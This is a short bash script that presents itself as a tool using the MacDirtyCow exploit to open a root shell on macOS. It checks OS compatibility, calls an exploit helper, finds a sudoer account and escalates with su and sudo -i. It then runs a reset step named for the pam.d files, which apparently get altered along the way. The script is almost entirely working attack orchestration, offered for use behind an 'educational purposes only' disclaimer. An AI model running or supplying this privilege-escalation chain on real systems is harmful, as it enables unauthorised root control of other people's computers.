#!/bin/bash

# This script will use the MacDirtyCow exploit to open a root shell in Mac.
# 
# This script is for educational purposes only. I am not responsible for any
# damage caused by this script.

cd $(dirname $0)

# Check compatibility
compat=$(./helpers/compat.command)
if [ $compat -eq 0 ]; then
	echo "Sorry, your macOS version ($(sw_vers -productVersion)) is not compatible with this program."
	exit 1
fi

# Run exploit
./helpers/exploit.command

# Find a sudoer
user=$(./helpers/find_sudoer.command)

# Use the sudoer to get root bash
su - $user -c "sudo -i"

# Revert pam.d files to original
sudo ./helpers/reset_pam.command